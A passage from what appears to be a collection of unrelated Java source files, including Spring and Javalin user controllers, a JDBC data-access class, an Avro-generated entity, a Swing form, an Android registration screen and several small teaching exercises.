return Result.success(user);\n    }\n\n    @PutMapping(\"/update\")\n    public Result update(@RequestBody @Validated User user){\n        userService.update(user);\n        return Result.success();\n    }\n\n    @PatchMapping(\"/updateAvatar\")\n    public Result updateAvatar(@RequestParam @URL String avatarUrl){\n        userService.updateAvatar(avatarUrl);\n        return Result.success();\n    }\n\n    @PatchMapping(\"/updatePwd\")\n    public Result updatePwd(@RequestBody Map<String,String> params){\n//        1.\u53c3\u6578\u6821\u9a57\n        String oldPwd = params.get(\"old_pwd\");\n        String newPwd = params.get(\"new_pwd\");\n        String rePwd = params.get(\"re_pwd\");\n\n        if(!StringUtils.hasLength(oldPwd) || !StringUtils.hasLength(newPwd) || !StringUtils.hasLength(rePwd)){\n            return Result.error(\"\u7f3a\u5c11\u5fc5\u8981\u53c3\u6578\");\n        }\n//        \u539f\u5bc6\u78bc\u662f\u5426\u6b63\u78ba\n//        \u8abf\u7528userService\u6839\u64da\u7528\u6236\u540d\u62ff\u5230\u539f\u5bc6\u78bc \u5728\u548cold_pwd\u6bd4\u5c0d\n        Map<String,Object> map = ThreadLocalUtil.get();\n        String username = (String) map.get(\"username\");\n        User loginUser = userService.finByUserName(username);\n        if(!loginUser.getPassword().equals(Md5Util.getMD5String(oldPwd))){\n            return Result.error(\"\u820a\u5bc6\u78bc\u932f\u8aa4\");\n        }\n//        newPwd\u8207rePwd\u662f\u5426\u4e00\u6a23\n        if(!newPwd.equals(rePwd)){\n            return Result.error(\"\u5169\u6b21\u586b\u5beb\u7684\u65b0\u5bc6\u78bc\u4e0d\u4e00\u6a23\");\n        }\n        userService.updatePwd(newPwd);\n        return Result.success();\n    }\n}\n",
    "import java.sql.*;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class SummerVacationDAL\n{\n    private Connection connection;\n\n    // Notice that the databaseName, user and password are passed into this method. We are in the DAL,\n    // and we cannot prompt the user for this information. That should be done in the presentation layer\n    private void InitializeConnection(String databaseName, String user, String password)\n    {\n        try\n        {\n            if(connection == null)\n            {\n               connection = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/\" + databaseName, user, password);\n            }\n        } \n        catch (SQLException exception)\n        {\n            System.out.println(\"Failed to connect to the database\" + exception.getMessage());\n        }\n    }\n\n    public SummerVacationDAL(String databaseName, String userName, String password)\n    {\n        InitializeConnection(databaseName, userName, password);\n    }\n\n    public List<String> TryGetDestinationForActivity(String activityName)\n    {\n        List<String> parks = new ArrayList<String>();\n        try\n        {\n            PreparedStatement myStatement = connection.prepareStatement(\"Select * From Plan Where ActivityName = ?\");\n            myStatement.setString(1, activityName);\n            ResultSet myRelation = myStatement.executeQuery();\n            while(myRelation.next())\n            {\n               parks.add(myRelation.getString(\"ParkName\"));                \n            }\n            return parks;\n        }\n        catch(SQLException ex)\n        {\n            System.out.println(\"Failed to get activity destinations\" + ex.getMessage());\n            return parks;\n        }\n      }\n}",
    "/**\n * Autogenerated by Avro\n *\n * DO NOT EDIT DIRECTLY\n */\npackage com.placide.k8skafkaavroaepccleanarchibsmicrosproject.domain.avrobeans;\n\nimport org.apache.avro.generic.GenericArray;\nimport org.apache.avro.specific.SpecificData;\nimport org.apache.avro.util.Utf8;\nimport org.apache.avro.message.BinaryMessageEncoder;\nimport org.apache.avro.message.BinaryMessageDecoder;\nimport org.apache.avro.message.SchemaStore;\n\n@org.apache.avro.specific.AvroGenerated\npublic class Employee extends org.apache.avro.specific.SpecificRecordBase implements org.apache.avro.specific.SpecificRecord {\n  private static final long serialVersionUID = 8340363388314212519L;\n\n\n  public static final org.apache.avro.Schema SCHEMA$ = new org.apache.avro.Schema.Parser().parse(\"{\\\"type\\\":\\\"record\\\",\\\"name\\\":\\\"Employee\\\",\\\"namespace\\\":\\\"com.placide.k8skafkaavroaepccleanarchibsmicrosproject.domain.avrobeans\\\",\\\"fields\\\":[{\\\"name\\\":\\\"employeeId\\\",\\\"type\\\":{\\\"type\\\":\\\"string\\\",\\\"avro.java.string\\\":\\\"String\\\"}},{\\\"name\\\":\\\"firstname\\\",\\\"type\\\":{\\\"type\\\":\\\"string\\\",\\\"avro.java.string\\\":\\\"String\\\"}},{\\\"name\\\":\\\"lastname\\\",\\\"type\\\":{\\\"type\\\":\\\"string\\\",\\\"avro.java.string\\\":\\\"String\\\"}},{\\\"name\\\":\\\"email\\\",\\\"type\\\":{\\\"type\\\":\\\"string\\\",\\\"avro.java.string\\\":\\\"String\\\"}},{\\\"name\\\":\\\"hireDate\\\",\\\"type\\\":{\\\"type\\\":\\\"string\\\",\\\"avro.java.string\\\":\\\"String\\\"}},{\\\"name\\\":\\\"state\\\",\\\"type\\\":{\\\"type\\\":\\\"string\\\",\\\"avro.java.string\\\":\\\"String\\\"}},{\\\"name\\\":\\\"role\\\",\\\"type\\\":{\\\"type\\\":\\\"string\\\",\\\"avro.java.string\\\":\\\"String\\\"}}]}\");\n  public static org.apache.avro.Schema getClassSchema() { return SCHEMA$; }\n\n  private static final SpecificData MODEL$ = new SpecificData();\n\n  private static final BinaryMessageEncoder<Employee> ENCODER =\n      new BinaryMessageEncoder<Employee>(MODEL$, SCHEMA$);\n\n  private static final BinaryMessageDecoder<Employee> DECODER =\n      new BinaryMessageDecoder<Employee>(MODEL$, SCHEMA$);\n\n  /**\n   * Return the BinaryMessageEncoder instance used by this class.\n   * @return the message encoder used by this class\n   */\n  public static BinaryMessageEncoder<Employee> getEncoder() {\n    return ENCODER;\n  }\n\n  /**\n   * Return the BinaryMessageDecoder instance used by this class.\n   * @return the message decoder used by this class\n   */\n  public static BinaryMessageDecoder<Employee> getDecoder() {\n    return DECODER;\n  }\n\n  /**\n   * Create a new BinaryMessageDecoder instance for this class that uses the specified {@link SchemaStore}.\n   * @param resolver a {@link SchemaStore} used to find schemas by fingerprint\n   * @return a BinaryMessageDecoder instance for this class backed by the given SchemaStore\n   */\n  public static BinaryMessageDecoder<Employee> createDecoder(SchemaStore resolver) {\n    return new BinaryMessageDecoder<Employee>(MODEL$, SCHEMA$, resolver);\n  }\n\n  /**\n   * Serializes this Employee to a ByteBuffer.\n   * @return a buffer holding the serialized data for this instance\n   * @throws java.io.IOException if this instance could not be serialized\n   */\n  public java.nio.ByteBuffer toByteBuffer() throws java.io.IOException {\n    return ENCODER.encode(this);\n  }\n\n  /**\n   * Deserializes a Employee from a ByteBuffer.\n   * @param b a byte buffer holding serialized data for an instance of this class\n   * @return a Employee instance decoded from the given buffer\n   * @throws java.io.IOException if the given bytes could not be deserialized into an instance of this class\n   */\n  public static Employee fromByteBuffer(\n      java.nio.ByteBuffer b) throws java.io.IOException {\n    return DECODER.decode(b);\n  }\n\n  private java.lang.String employeeId;\n  private java.lang.String firstname;\n  private java.lang.String lastname;\n  private java.lang.String email;\n  private java.lang.String hireDate;\n  private java.lang.String state;\n  private java.lang.String role;\n\n  /**\n   * Default constructor.  Note that this does not initialize fields\n   * to their default values from the schema.  If that is desired then\n   * one should use <code>newBuilder()</code>.\n   */\n  public Employee() {}\n\n  /**\n   * All-args constructor.\n   * @param employeeId The new value for employeeId\n   * @param firstname The new value for firstname\n   * @param lastname The new value for lastname\n   * @param email The new value for email\n   * @param hireDate The new value for hireDate\n   * @param state The new value for state\n   * @param role The new value for role\n   */\n  public Employee(java.lang.String employeeId, java.lang.String firstname, java.lang.String lastname, java.lang.String email, java.lang.String hireDate, java.lang.String state, java.lang.String role) {\n    this.employeeId = employeeId;\n    this.firstname = firstname;\n    this.lastname = lastname;\n    this.email = email;\n    this.hireDate = hireDate;\n    this.state = state;\n    this.role = role;\n  }\n\n  public org.apache.avro.specific.SpecificData getSpecificData() { return MODEL$; }\n  public org.apache.avro.Schema getSchema() { return SCHEMA$; }\n  // Used by DatumWriter.  Applications should not call.\n  public ja",
    "package com.djalves.workshopmongodocker.config;\n\nimport com.djalves.workshopmongodocker.models.embadded.Author;\nimport com.djalves.workshopmongodocker.models.embadded.Comment;\nimport com.djalves.workshopmongodocker.models.entities.Post;\nimport com.djalves.workshopmongodocker.models.entities.User;\nimport com.djalves.workshopmongodocker.repositories.PostRepository;\nimport com.djalves.workshopmongodocker.repositories.UserRepository;\nimport jakarta.annotation.PostConstruct;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.context.annotation.Profile;\n\nimport java.time.Instant;\nimport java.util.Arrays;\n\n@Configuration\n@Profile(\"test\")\npublic class TestConfig {\n\n    @Autowired\n    private UserRepository userRepository;\n\n    @Autowired\n    private PostRepository postRepository;\n\n    @PostConstruct\n    public void init() {\n\n        userRepository.deleteAll();\n        postRepository.deleteAll();\n\n        User maria = new User(null, \"Maria Brown\", \"maria@gmail.com\");\n        User alex = new User(null, \"Alex Green\", \"alex@gmail.com\");\n        User bob = new User(null, \"Bob Grey\", \"bob@gmail.com\");\n\n        userRepository.saveAll(Arrays.asList(maria, alex, bob));\n\n        Post post1 = new Post(null, Instant.parse(\"2021-02-13T11:15:01Z\"), \"Partiu viagem\", \"Vou viajar para S\u00e3o Paulo. Abra\u00e7os!\", new Author(maria));\n        Post post2 = new Post(null, Instant.parse(\"2021-02-14T10:05:49Z\"), \"Bom dia\", \"Acordei feliz hoje!\", new Author(maria));\n\n        Comment c1 = new Comment(\"Boa viagem mano!\", Instant.parse(\"2021-02-13T14:30:01Z\"), new Author(alex));\n        Comment c2 = new Comment(\"Aproveite\", Instant.parse(\"2021-02-13T15:38:05Z\"), new Author(bob));\n        Comment c3 = new Comment(\"Tenha um \u00f3timo dia!\", Instant.parse(\"2021-02-14T12:34:26Z\"), new Author(alex));\n\n        post1.getComments().addAll(Arrays.asList(c1, c2));\n        post2.getComments().addAll(Arrays.asList(c3));\n\n        postRepository.saveAll(Arrays.asList(post1, post2));\n\n        maria.getPosts().addAll(Arrays.asList(post1, post2));\n        userRepository.save(maria);\n    }\n}\n",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JInternalFrame.java to edit this template\n */\npackage vistas;\n\nimport javax.swing.table.DefaultTableModel;\n\n/**\n *\n * @author Ferrando Carlos\n */\npublic class PorNombreView extends javax.swing.JInternalFrame {\n\n    //Crear el modelo para la tabla\n    private DefaultTableModel modelo = new DefaultTableModel() {\n        @Override\n        public boolean isCellEditable(int f, int c) {\n            return false;\n        }\n\n    };\n\n    /**\n     * Creates new form PorNombreView\n     */\n    public PorNombreView() {\n        initComponents();\n        armarCabecera();\n    }\n\n    /**\n     * This method is called from within the constructor to initialize the form. WARNING: Do NOT modify this code. The content of this method is always regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        jLabel1 = new javax.swing.JLabel();\n        jLabel2 = new javax.swing.JLabel();\n        jtfNombre = new javax.swing.JTextField();\n        jScrollPane1 = new javax.swing.JScrollPane();\n        jtProductos = new javax.swing.JTable();\n\n        setClosable(true);\n        setMaximizable(true);\n        setTitle(\"Busqueda Por Nombre\");\n        setToolTipText(\"\");\n        setFont(new java.awt.Font(\"Arial\", 0, 10)); // NOI18N\n        setMaximumSize(new java.awt.Dimension(670, 570));\n        setName(\"\"); // NOI18N\n        setPreferredSize(new java.awt.Dimension(500, 500));\n\n        jLabel1.setFont(new java.awt.Font(\"Arial\", 0, 24)); // NOI18N\n        jLabel1.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);\n        jLabel1.setText(\"Listado Por Nombre\");\n\n        jLabel2.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);\n        jLabel2.setText(\"Ingresar los pimeros caracteres:\");\n\n        jtfNombre.setHorizontalAlignment(javax.swing.JTextField.RIGHT);\n        jtfNombre.addKeyListener(new java.awt.event.KeyAdapter() {\n            public void keyReleased(java.awt.event.KeyEvent evt) {\n                jtfNombreKeyReleased(evt);\n            }\n        });\n\n        jtProductos.setModel(new javax.swing.table.DefaultTableModel(\n            new Object [][] {\n                {null, null, null, null},\n                {null, null, null, null},\n                {null, null, null, null},\n                {null, null, null, null}\n            },\n            new String [] {\n                \"Title 1\", \"Title 2\", \"Title 3\", \"Title 4\"\n            }\n        ));\n        jScrollPane1.setViewportView(jtProductos);\n\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());\n        getContentPane().setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()\n                .addContainerGap(42, Short.MAX_VALUE)\n                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)\n                    .addGroup(layout.createSequentialGroup()\n                        .addComponent(jLabel2)\n                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                        .addComponent(jtfNombre, javax.swing.GroupLayout.PREFERRED_SIZE, 340, javax.swing.GroupLayout.PREFERRED_SIZE))\n                    .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 548, javax.swing.GroupLayout.PREFERRED_SIZE))\n                .addGap(40, 40, 40))\n            .addGroup(layout.createSequentialGroup()\n                .addGap(205, 205, 205)\n                .addComponent(jLabel1)\n                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))\n        );\n        layout.setVerticalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(layout.createSequentialGroup()\n                .addGap(68, 68, 68)\n                .addComponent(jLabel1)\n                .addGap(69, 69, 69)\n                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                    .addComponent(jLabel2)\n                    .addComponent(jtfNombre, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 69, Short.MAX_VALUE)\n                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 176, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addGap(65, 65, 65))\n        );\n\n        pack();\n    }// </editor-fold>//GEN-END:initComponents\n\n    private void jtfNombreKeyReleased(java",
    "package app.controllers;\n\nimport app.validators.EmailValidator;\nimport app.entities.User;\nimport app.exceptions.DatabaseException;\nimport app.persistence.ConnectionPool;\nimport app.persistence.UserMapper;\nimport app.validators.PasswordValidator;\nimport app.validators.PayUserValidate;\nimport io.javalin.Javalin;\nimport io.javalin.http.Context;\n\nimport java.util.List;\n\npublic class UserController {\n    public static void addRoutes(Javalin app, ConnectionPool connectionPool) {\n        app.get(\"/\", ctx -> ctx.render(\"login.html\"));\n        app.post(\"login\", ctx -> login(ctx, connectionPool));\n        app.get(\"createuser\", ctx -> ctx.render(\"createuser.html\"));\n        app.post(\"createuser\", ctx -> createUser(ctx, connectionPool));\n\n        app.get(\"payuser\", ctx -> displayPayUser(ctx, connectionPool));\n        app.post(\"payuser\", ctx -> payUser(ctx, connectionPool));\n\n    }\n\n    private static void displayPayUser(Context ctx, ConnectionPool connectionPool) throws DatabaseException {\n        List<User> userList = UserMapper.getAllUsers(connectionPool);\n        ctx.attribute(\"userList\", userList);\n        ctx.render(\"payuser.html\");\n    }\n\n    private static void payUser(Context ctx, ConnectionPool connectionPool) throws DatabaseException {\n\n        //Check om amount er et talv\u00e6rdi\n        if (PayUserValidate.isValidInput(ctx.formParam(\"amount\"))) {\n\n            // Hent formparametre\n            int amount = Integer.parseInt(ctx.formParam(\"amount\"));\n            int userId = Integer.parseInt(ctx.formParam(\"userId\"));\n            int balance = Integer.parseInt(ctx.formParam(\"balance\"));\n\n            //Check om der er nok p\u00e5 kontoen, hvis der tr\u00e6kkes fra\n            if (PayUserValidate.isValidPayment(amount, balance)) {\n\n                try {\n                    UserMapper.setUserBalance(amount, userId, connectionPool);\n                    List<User> userList = UserMapper.getAllUsers(connectionPool);\n                    ctx.attribute(\"userList\", userList);\n                    ctx.render(\"payuser.html\");\n                } catch (DatabaseException e) {\n                    ctx.attribute(\"message\", \"Something went wrong. Try again.\");\n                    ctx.render(\"payuser.html\");\n                }\n            } else {\n                List<User> userList = UserMapper.getAllUsers(connectionPool);\n                ctx.attribute(\"userList\", userList);\n                ctx.attribute(\"message\", \"Insufficient funds. Try again.\");\n                ctx.render(\"payuser.html\");\n            }\n        } else {\n            List<User> userList = UserMapper.getAllUsers(connectionPool);\n            ctx.attribute(\"userList\", userList);\n            ctx.attribute(\"message\", \"Invalid input. Try again.\");\n            ctx.render(\"payuser.html\");\n        }\n    }\n\n    public static void login(Context ctx, ConnectionPool connectionPool) {\n\n        // Hent formparametre\n        String email = ctx.formParam(\"email\");\n        String password = ctx.formParam(\"password\");\n\n        // Check om bruger findes i DB med de angivne email + password\n        try {\n            User user = UserMapper.login(email, password, connectionPool);\n            ctx.sessionAttribute(\"currentUser\", user);\n            // Hvis ja, send videre til task siden\n\n            // Gem brugerens ordrehistorik i en liste og som attribute\n            // List<Order> orderList = OrderMapper.getAllOrdersPerUser(user.getUserId(), connectionPool);\n            // ctx.attribute(\"orderList\", orderList);\n            ctx.redirect(\"/frontpage\");\n        } catch (DatabaseException e) {\n            // Hvis nej, send tilbage til login side med fejl besked\n            ctx.attribute(\"message\", e.getMessage());\n            ctx.render(\"login.html\");\n        }\n    }\n\n    private static void createUser(Context ctx, ConnectionPool connectionPool) {\n\n        String email = ctx.formParam(\"email\");\n        String password1 = ctx.formParam(\"password1\");\n        String password2 = ctx.formParam(\"password2\");\n\n        if (EmailValidator.isValidEmail(email)) {\n            if (PasswordValidator.isValidPassword(password1)) {\n                if (password1.equals(password2)) {\n                    try {\n                        UserMapper.createuser(email, password1, connectionPool);\n                        ctx.attribute(\"message\", \"User with email \" + email + \" succesfully created. You can now login.\");\n                        ctx.render(\"login.html\");\n                    } catch (DatabaseException e) {\n                        ctx.attribute(\"message\", \"Email already exists. Try again.\");\n                        ctx.render(\"createuser.html\");\n                    }\n                } else {\n                    ctx.attribute(\"message\", \"The entered passwords don't match. Try again.\");\n                    ctx.render(\"createuser.html\");\n                }\n            } else {\n                ctx.attribute(\"message\", \"The entered password is not valid. It must contain minimum 8 letters, an uppercase, a lowercase and a number.",
    "package com.resendil.loginauthapi.infra.security;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.http.HttpMethod;\nimport org.springframework.security.authentication.AuthenticationManager;\nimport org.springframework.security.config.annotation.authentication.configuration.AuthenticationConfiguration;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.config.http.SessionCreationPolicy;\nimport org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;\nimport org.springframework.security.crypto.password.PasswordEncoder;\nimport org.springframework.security.web.SecurityFilterChain;\nimport org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;\n\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n\n    @Autowired\n    private CustomUserDetailsService userDetailsService;\n\n    @Autowired\n    SecurityFilter securityFilter;\n\n    @Bean\n    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {\n        http\n                .csrf(csrf -> csrf.disable())\n                .sessionManagement(session -> session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))\n                .authorizeHttpRequests(authorize -> authorize\n                        .requestMatchers(HttpMethod.POST, \"/auth/login\").permitAll()\n                        .requestMatchers(HttpMethod.POST, \"/auth/register\").permitAll()\n                        .anyRequest().authenticated()\n                )\n                .addFilterBefore(securityFilter, UsernamePasswordAuthenticationFilter.class);\n        return http.build();\n    }\n\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder();\n    }\n\n    @Bean\n    public AuthenticationManager authenticationManager(AuthenticationConfiguration authenticationConfiguration) throws Exception {\n        return authenticationConfiguration.getAuthenticationManager();\n    }\n}",
    "package br.com.itcompany.core;\n\nimport br.com.itcompany.core.entity.moeda.Moeda;\n\nimport java.util.List;\n\npublic class Cofrinho {\n    private final IMoedaDAO listaMoedas;\n\n    public Cofrinho(IMoedaDAO moedas) {\n        this.listaMoedas = moedas;\n    }\n\n    public Moeda adicionarMoeda(Moeda moeda) {\n        Moeda moedaEncontrada = listaMoedas.find(moeda.info());\n        if (moedaEncontrada != null) {\n            moedaEncontrada.setValor(moedaEncontrada.getValor() + moeda.getValor());\n            return listaMoedas.update(moedaEncontrada);\n        }\n        return listaMoedas.insert(moeda);\n    }\n\n    public Moeda removerMoeda(Moeda moeda) {\n        Moeda moedaEncontrada = listaMoedas.find(moeda.info());\n        if (moedaEncontrada != null) {\n            double valorRemovido = moedaEncontrada.getValor() - moeda.getValor();\n            if (valorRemovido > 0) {\n                moedaEncontrada.setValor(valorRemovido);\n                return listaMoedas.update(moedaEncontrada);\n            }\n            return listaMoedas.remove(moeda);\n        }\n        return null;\n    }\n\n    public List<Moeda> listarMoedas() {\n        return listaMoedas.list();\n    }\n\n    public Double totalConvertido() {\n        return !listaMoedas.list().isEmpty() ? listaMoedas.list().stream().mapToDouble(Moeda::converter).sum() : 0.0;\n    }\n}\n",
    "package com.example.login;\n\nimport androidx.appcompat.app.AppCompatActivity;\n\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.EditText;\nimport android.widget.Toast;\n\npublic class Register extends AppCompatActivity {\n    private EditText username,password,confirm_password;\n    Button register;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        username= (EditText) findViewById(R.id.username);\n        password=(EditText) findViewById(R.id.password);\n        confirm_password=(EditText) findViewById(R.id.confirm_password);\n        register=(Button) findViewById(R.id.register);\n\n        register.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                if(username != null && password != null && confirm_password != null) {\n                    if(password == confirm_password){\n\n                    }else{\n                        Toast.makeText(Register.this, \"Password and Confirmed password don't match\", Toast.LENGTH_SHORT).show();\n                    }\n\n                }else {\n                    Toast.makeText(Register.this, \"All field must be filled\", Toast.LENGTH_SHORT).show();\n                }\n            }\n        });\n\n    }\n}",
    "package application;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Locale;\nimport java.util.Scanner;\n\nimport entities.Employee;\nimport entities.OutsourcedEmployee;\n\npublic class Program {\n\n\tpublic static void main(String[] args) {\n\t\t\n\t\tLocale.setDefault(Locale.US);\n\t\tScanner sc = new Scanner(System.in);\n\t\t\n\t\tList<Employee> list = new ArrayList<>();\n\t\t\n\t\tSystem.out.print(\"Enter the number of employees: \");\n\t\tint n = sc.nextInt();\n\t\t\n\t\tfor(int i=1; i<=n; i++){\n\t\t\tSystem.out.println(\"Empolyee #\" + i + \" data: \");\n\t\t\tSystem.out.print(\"Outsourced (y/n)? \");\n\t\t\tchar ch = sc.next().charAt(0);\n\t\t\tSystem.out.print(\"Name: \");\n\t\t\tsc.nextLine();\n\t\t\tString name = sc.nextLine();\n\t\t\tSystem.out.print(\"Hours: \");\n\t\t\tint hours = sc.nextInt();\n\t\t\tSystem.out.print(\"Value per hour: \");\n\t\t\tdouble valuePerHour = sc.nextDouble();\n\t\t\t\n\t\t\tif(ch == 'y'){\n\t\t\t\tSystem.out.print(\"Additional charge: \");\n\t\t\t\tdouble additionalCharge = sc.nextDouble();\n\t\t\t\t//Employee emp = new OutsourcedEmployee(name, hours, valuePerHour,additionalCharge);\n\t\t\t\tlist.add(new OutsourcedEmployee(name, hours, valuePerHour,additionalCharge));\n\t\t\t}\n\t\t\telse {\n\t\t\t\t//Employee emp = new Employee(name, hours, valuePerHour);\n\t\t\t\tlist.add(new Employee(name, hours, valuePerHour));\n\t\t\t}\n\t\t}\n\t\t\n\t\tSystem.out.println();\n\t\tSystem.out.println(\"Payments: \");\n\t\tfor (Employee emp : list){\n\t\t\tSystem.out.println(emp.getName() + \" - US$ \" + String.format(\"%.2f\", emp.payment()));\n\t\t}\n\t\t\n\t\tsc.close();\n\t}\n\n}\n",
    "package entities;\n\nimport java.text.SimpleDateFormat;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\n\npublic class Post {\n\t\n\tprivate static SimpleDateFormat sdf = new SimpleDateFormat(\"dd/MM/yyyy HH:mm:ss\");\n\t\n\tprivate Date moment;\n\tprivate String title;\n\tprivate String content;\n\tprivate Integer likes;\n\t\n\tprivate List<Comment> comments = new ArrayList<>();\n\t\n\tpublic Post(){\n\t}\n\n\tpublic Post(Date moment, String title, String content, Integer likes) {\n\t\tthis.moment = moment;\n\t\tthis.title = title;\n\t\tthis.content = content;\n\t\tthis.likes = likes;\n\t}\n\n\tpublic Date getMoment() {\n\t\treturn moment;\n\t}\n\n\tpublic void setMoment(Date moment) {\n\t\tthis.moment = moment;\n\t}\n\n\tpublic String getTitle() {\n\t\treturn title;\n\t}\n\n\tpublic void setTitle(String title) {\n\t\tthis.title = title;\n\t}\n\n\tpublic String getContent() {\n\t\treturn content;\n\t}\n\n\tpublic void setContent(String content) {\n\t\tthis.content = content;\n\t}\n\n\tpublic Integer getLikes() {\n\t\treturn likes;\n\t}\n\n\tpublic void setLikes(Integer likes) {\n\t\tthis.likes = likes;\n\t}\n\n\tpublic List<Comment> getComments() {\n\t\treturn comments;\n\t}\n\n\tpublic void addComment(Comment comment){\n\t\tcomments.add(comment);\n\t}\n\t\n\tpublic void removeComment(Comment comment){\n\t\tcomments.remove(comment);\n\t}\n\t\n\tpublic String toString(){\n\t\tStringBuilder sb = new StringBuilder();\n\t\tsb.append(title + \"\\n\");\n\t\tsb.append(likes);\n\t\tsb.append(\" Likes - \");\n\t\tsb.append(sdf.format(moment) + \"\\n\");\n\t\tsb.append(content + \"\\n\");\n\t\tsb.append(\"Comments:\\n\");\n\t\tfor(Comment c : comments){\n\t\t\tsb.append(c.getText() + \"\\n\");\n\t\t}\n\t\treturn sb.toString();\n\t}\n}\n",
    "package com.campusdual.classroom;\n\nimport org.junit.jupiter.api.AfterEach;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.DisplayName;\nimport org.junit.jupiter.api.Test;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.PrintStream;\n\nimport static org.junit.jupiter.api.Assertions.*;\n\nclass Exercise08Test {\n\n    private final ByteArrayOutputStream outContent = new ByteArrayOutputStream();\n    private final ByteArrayOutputStream errContent = new ByteArrayOutputStream();\n    private final PrintStream originalOut = System.out;\n    private final PrintStream originalErr = System.err;\n\n    @BeforeEach\n    void setUp() {\n        this.outContent.reset();\n        this.errContent.reset();\n        System.setOut(new PrintStream(this.outContent));\n        System.setErr(new PrintStream(this.errContent));\n    }\n\n    @AfterEach\n    void tearDown() {\n        System.setOut(this.originalOut);\n        System.setErr(this.originalErr);\n    }\n\n\n    @Test\n    @DisplayName(\"Check while loop iterations\")\n    void testWhileLoopIterations() {\n        int n1 = 15;\n        Exercise08.whileLoop(n1);\n        for (int num = 0; num < n1; num++) {\n            String expectedMessage = num+\" < \"+n1+\". El pr\u00f3ximo ciclo valdr\u00e1: \"+(num+1);\n            assertTrue(this.outContent.toString().contains(expectedMessage), \"Loop inspection message is not correct\");\n        }\n    }\n}",
    "package com.educacionit.excepciones;\n\npublic class DBManagerException extends Exception {\n\tprivate static final long serialVersionUID = 1L;\n\n\tprivate Integer error;\n\tpublic static final int ERROR_1 = 1;\n\tpublic static final int ERROR_2 = 2;\n\tpublic static final int ERROR_3 = 3;\n\tpublic static final int ERROR_4 = 4;\n\tpublic static final int ERROR_5 = 5;\n\tpublic static final int ERROR_6 = 6;\n\tpublic static final int ERROR_7 = 7;\n\tpublic static final int ERROR_8 = 8;\n\n\tpublic DBManagerException(Integer error) {\n\t\tsuper();\n\t\tthis.error = error;\n\t}\n\n\tpublic DBManagerException(Integer error, String message) {\n\t\tsuper(message);\n\t\tthis.error = error;\n\t}\n\n\tpublic DBManagerException(Integer error, Throwable cause) {\n\t\tsuper(cause);\n\t\tthis.error = error;\n\t}\n\n\tpublic DBManagerException(Integer error, String message, Throwable cause) {\n\t\tsuper(message, cause);\n\t\tthis.error = error;\n\n\t}\n\n\tpublic Integer getErrorCode() {\n\t\treturn error;\n\t}\n\n\t@Override\n\tpublic String getMessage() {\n\t\tswitch (error) {\n\t\tcase ERROR_1:\n\t\t\treturn \"Error al mostrar las Peliculas. \\nError: \" + super.getMessage();\n\t\tcase ERROR_2:\n\t\t\treturn \"Error al obtener las Peliculas. \\nError: \" + super.getMessage();\n\t\tcase ERROR_3:\n\t\t\treturn \"Error al mostrar la Pelicula. \\nError: \" + super.getMessage();\n\t\tcase ERROR_4:\n\t\t\treturn \"Error al mostrar la Pelicula. \\nError: \" + super.getMessage();\n\t\tcase ERROR_5:\n\t\t\treturn \"No Existe ese Nro de codigo. \\nError: \" + super.getMessage();\n\t\tcase ERROR_6:\n\t\t\treturn \"No se pudo insertar la Pelicula. \\nError: \" + super.getMessage();\n\t\tcase ERROR_7:\n\t\t\treturn \"Error al modificar la Pelicula. \\nError: \" + super.getMessage();\n\t\tcase ERROR_8:\n\t\t\treturn \"Error al eliminar la Pelicula. \\nError: \" + super.getMessage();\n\t\tdefault:\n\t\t\treturn super.getMessage();\n\t\t}\n\t}\n}\n",
